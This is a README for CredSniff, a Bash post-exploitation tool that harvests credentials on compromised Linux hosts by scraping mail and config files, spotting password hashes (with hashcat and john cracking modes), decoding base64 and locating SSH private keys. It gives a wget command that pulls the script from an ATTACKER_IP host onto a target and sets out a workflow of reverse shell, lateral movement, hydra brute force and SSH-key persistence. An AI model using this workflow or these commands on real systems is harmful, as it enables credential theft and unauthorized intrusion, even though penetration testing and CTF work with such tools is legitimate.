# CredSniff

```
  ██████╗██████╗ ███████╗██████╗ ███████╗███╗   ██╗██╗███████╗███████╗
 ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝████╗  ██║██║██╔════╝██╔════╝
 ██║     ██████╔╝█████╗  ██║  ██║███████╗██╔██╗ ██║██║█████╗  █████╗
 ██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║██║╚██╗██║██║██╔══╝  ██╔══╝
 ╚██████╗██║  ██║███████╗██████╔╝███████║██║ ╚████║██║██║     ██║
  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝
```

**Targeted credential extraction and analysis for Linux post-exploitation.**

CredSniff is a lightweight, zero-dependency Bash tool designed for penetration testers who need fast, actionable credential intelligence from a compromised Linux host. It goes beyond simple grepping — it identifies, classifies, and produces structured attack paths from what it finds.

---

## Why CredSniff?

During post-exploitation, you typically land on a box and need to answer one question fast: **what credentials exist here and how do I use them?**

Tools like LinPEAS are comprehensive but noisy. Manual grepping works but misses encoded secrets, hashes buried in configs, and SSH keys sitting in unexpected directories. CredSniff fills the gap between a raw `grep` and a full enumeration suite — it's a credential-focused sniper, not a shotgun.

**The problem it solves:**
```bash
# You land on a box as a low-priv user. You know usernames: jim, charles, sam.
# You need passwords. Fast.

# Manual approach — misses mail (no extension), noisy, no analysis:
grep -irE "password|charles|sam" /var --include="*.txt" 2>/dev/null

# CredSniff approach — scrapes everything, detects hashes/b64/keys, builds attack paths:
./credsniff.sh -p "jim|charles|sam|password"
```

---

## Features

| Capability | Description |
|---|---|
| **Pattern matching** | Grep-E regex across all files including extensionless (mail, cron, configs) |
| **Hash detection** | Identifies bcrypt, sha512crypt, sha256crypt, md5crypt, APR1, NTLM, SHA-1/256/512, MySQL, DES crypt |
| **Hash cracking guidance** | Outputs exact `hashcat -m` mode and `john --format=` for every hash found |
| **Base64 decoding** | Decodes base64 strings and flags those containing credential keywords |
| **SSH key discovery** | Finds private keys, identifies type (RSA/DSA/EC/OpenSSH), encryption status, and file permissions |
| **Mail scraping** | Directly reads `/var/mail/` and `/var/spool/mail/` — a common CTF/real-world credential source |
| **Credential extraction** | Parses `user:pass` pairs, `password=value` patterns, and database connection strings |
| **Attack path generation** | Compiles findings into numbered, actionable next steps |
| **Clean output** | Suppresses permission errors and binary file noise automatically |
| **Report export** | Optional `-o` flag writes a stripped (no ANSI) report to file |

---

## Installation

No dependencies. Pure Bash. Works on any Linux system with coreutils and grep.

```bash
git clone https://github.com/JonnyRiga/credsniff-tool.git
cd credsniff-tool
chmod +x credsniff.sh
```

### Deploy to target (post-exploitation)

On your attack machine:
```bash
cd credsniff-tool
python3 -m http.server 80
```

On the target:
```bash
cd /tmp
wget http://ATTACKER_IP/credsniff.sh
chmod +x credsniff.sh
```

---

## Usage

```
./credsniff.sh -p PATTERN [-d DIR] [-o FILE] [-c NUM] [-v]
```

### Options

| Flag | Description | Default |
|---|---|---|
| `-p PATTERN` | **Required.** Extended regex pattern to search for | — |
| `-d DIR` | Target directory to scrape | `/var` |
| `-o FILE` | Write report to file (ANSI stripped) | stdout only |
| `-c NUM` | Context lines around each match | `2` |
| `-v` | Verbose mode — show all raw matches | off |
| `-h` | Show help | — |

### Examples

```bash
# Hunt for credentials linked to known usernames
./credsniff.sh -p "jim|charles|sam|password"

# Scrape /home for secrets
./credsniff.sh -d /home -p "admin|root|secret|token"

# Target /etc for database credentials, save report
./credsniff.sh -d /etc -p "db_pass|mysql|postgres" -o loot.txt

# Broad credential sweep with extra context
./credsniff.sh -d /var -p "pass|cred|secret|key|token|auth" -c 5

# Focus on a specific web app directory
./credsniff.sh -d /var/www -p "password|api_key|secret_key"
```

---

## How It Works

CredSniff executes five sequential phases, each building on the intelligence gathered:

### Phase 1 — Pattern Matching

Runs `grep -rlE` against the target directory with the user-supplied pattern. Unlike manual grepping:

- **No file extension filter** — catches extensionless files like mail, crontabs, and flat configs that `--include="*.txt"` would miss
- **Suppresses noise** — permission denied errors and binary file matches are silenced (`2>/dev/null`, `grep -v "Binary file"`)
- **Context-aware** — shows surrounding lines (configurable with `-c`) so you can read the credential in context
- **Inline extraction** — every matched line is immediately fed to the credential parser (Phase 1 feeds directly into the report)

**What it extracts from matches:**
- `user:password` pairs (with false-positive filtering for protocols, paths, timestamps)
- `password=value` / `passwd:value` / `pass=value` patterns
- Database connection strings: `mysql://user:pass@host`, `postgres://...`, `mongodb://...`

### Phase 2 — Hash Detection

Scans the target directory for hash patterns using two strategies:

**Shadow-style hashes** — regex: `\$[0-9a-z]+\$[^\s:]{8,}`
- Catches `$1$` (md5crypt), `$5$` (sha256crypt), `$6$` (sha512crypt), `$2b$` (bcrypt), `$apr1$` (Apache)

**Standalone hex hashes** — regex: `\b[a-fA-F0-9]{32,128}\b`
- Catches MD5 (32 chars), SHA-1 (40), SHA-256 (64), SHA-512 (128), MySQL323 (16), DES (13)

Each hash is identified by type and paired with the exact cracking command:

| Hash Type | Hashcat Mode | John Format |
|---|---|---|
| bcrypt | `-m 3200` | `--format=bcrypt` |
| sha512crypt | `-m 1800` | `--format=sha512crypt` |
| sha256crypt | `-m 7400` | `--format=sha256crypt` |
| md5crypt | `-m 500` | `--format=md5crypt` |
| Apache APR1 | `-m 1600` | `--format=md5crypt-long` |
| MD5 / NTLM | `-m 0` / `-m 1000` | — |
| SHA-1 | `-m 100` | `--format=raw-sha1` |
| SHA-256 | `-m 1400` | `--format=raw-sha256` |
| SHA-512 | `-m 1700` | `--format=raw-sha512` |
| MySQL323 | `-m 200` | `--format=mysql` |
| DES crypt | `-m 1500` | `--format=descrypt` |

### Phase 3 — Base64 Decoding

Extracts base64-encoded strings (12+ chars, valid charset, proper padding) and attempts decoding. To avoid noise, it applies two filters:

1. **Printable check** — decoded output must be ASCII-printable text (rejects binary garbage)
2. **Keyword filter** — only surfaces decoded strings containing: `pass`, `user`, `key`, `token`, `secret`, `admin`, `root`, `login`, `cred`, `auth`, `flag`

This catches encoded credentials in config files, environment variables, and application data without flooding you with decoded CSS or HTML fragments.

### Phase 4 — SSH Key Discovery

Searches for files containing `PRIVATE KEY` and extracts:

- **Key type** — RSA, DSA, EC, or OpenSSH
- **Encryption status** — whether the key is passphrase-protected (`ENCRYPTED` header)
- **File permissions** — useful for determining if the key is usable as-is

**Output depends on encryption status:**
- **Unencrypted:** Direct usage command: `chmod 600 key && ssh -i key user@target`
- **Encrypted:** Cracking command: `ssh2john key > hash && john hash --wordlist=rockyou.txt`

### Phase 5 — Mail Scraping

Directly reads `/var/mail/` and `/var/spool/mail/` — directories that manual `grep --include` approaches consistently miss because mail files have no extension.

For each readable mail file:
1. Checks if the mail content matches the user-supplied pattern
2. Independently checks for credential keywords (`password`, `passwd`, `credentials`, `secret`)
3. Feeds any matches through the credential extractor

This phase is particularly effective in CTF environments where inter-user emails frequently contain plaintext passwords.

---

## Report Structure

After all five phases complete, CredSniff compiles a deduplicated findings report:

```
┌─ Potential Credentials ─────────────────────────────────────┐
│ User: charles                                                │
│ Pass: D4rkPa$$w0rd!                                         │
│ From: /var/mail/jim                                          │
└─────────────────────────────────────────────────────────────┘

┌─ Hashes Found ──────────────────────────────────────────────┐
│ Type:  sha512crypt (shadow)                                  │
│ Hash:  $6$rounds=5000$saltsalt$...                           │
│ Crack: hashcat -m 1800 / john --format=sha512crypt           │
└─────────────────────────────────────────────────────────────┘

┌─ Attack Paths ──────────────────────────────────────────────┐
│ 1. Read full mail: cat /var/mail/jim                         │
│ 2. Crack sha512crypt hash: hashcat -m 1800                   │
│                                                              │
│ Quick wins:                                                  │
│   su - <user>             Try extracted passwords            │
│   ssh <user>@localhost    Lateral movement                   │
│   hydra -L users -P passes ssh://target                      │
└─────────────────────────────────────────────────────────────┘
```

If nothing actionable is found, it provides targeted suggestions for broadening the search.

---

## Real-World Workflow

```
1. Land on box (reverse shell / SSH as low-priv user)
2. Upload credsniff.sh to /tmp
3. Run with known usernames + credential keywords
4. Review findings report
5. Use extracted creds for lateral movement (su, ssh)
6. Crack any hashes offline (hashcat/john)
7. Use discovered SSH keys for persistence
```

---

## Limitations

- **Read permissions** — can only access files the current user can read. Run as root for full coverage.
- **Binary files** — skips binary content intentionally to reduce noise.
- **Hash identification** — hex-based hashes (MD5 vs NTLM) can be ambiguous at 32 chars. Use `hashid` or `hash-identifier` to confirm.
- **Base64** — conservative filtering means some encoded secrets may be skipped if they don't contain keyword triggers.

---

## License

MIT License. Use responsibly and only on systems you have explicit authorization to test.
